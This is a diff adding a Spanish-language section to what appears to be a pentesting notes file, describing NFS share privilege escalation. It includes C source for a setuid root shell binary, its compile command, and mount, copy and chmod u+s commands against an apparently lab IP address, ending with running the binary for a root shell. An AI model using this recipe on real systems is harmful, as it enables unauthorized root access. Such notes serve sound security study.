@@ -501,7 +501,41 @@ Mostrar cuanto espacio usa los montajes
 ![image](https://user-images.githubusercontent.com/63270579/209453242-fb0dd670-7c39-470f-b7bb-6e3f5b760845.png)
 
 	
+Esta vulnerabilidad se resume en lo seguido el cliente con permisisos de root crear un binario en este caso este:
+	
+```
+//cat shell.c 
 
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}	
+	
+gcc shell.c -o shell	
+	
+```
+
+El cliente monta una carpeta compartida por el host 
+	
+```
+sudo mount -t nfs 10.129.2.12:/tmp /mnt
+cp shell /mnt
+chmod u+s /mnt/shell	
+	
+```
+Esto sube el archivo suid al host. regresamos al host y ejecutamos esa shell y obtenemos una shell con privilegios de root.
+	
+
+	
+	
+	
+	
+	
+	
+	
 	
 	
 	
